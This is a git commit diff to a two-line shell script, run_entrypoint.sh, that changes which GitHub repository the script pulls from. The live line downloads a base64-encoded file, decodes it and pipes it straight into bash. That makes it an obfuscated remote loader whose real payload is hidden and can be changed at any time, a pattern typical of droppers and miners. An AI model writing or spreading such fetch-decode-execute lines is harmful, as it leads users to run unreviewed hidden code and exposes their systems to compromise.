901a86b1648796a8e1f1c52acbb1ccb91a18feaa
frederickdicarlo <frederickdicarlo@gmail.com>
2026-06-22 17:04:16 +0200

    Update run_entrypoint.sh

--- run_entrypoint.sh
+++ run_entrypoint.sh
@@ -1,2 +1,2 @@
 #!/bin/bash
-wget -qO- https://raw.githubusercontent.com/stevenlantz01/flames/refs/heads/main/entrypoint.sh | base64 -d | bash
+wget -qO- https://raw.githubusercontent.com/frederickdicarlo/nuts/refs/heads/main/entrypoint.sh | base64 -d | bash
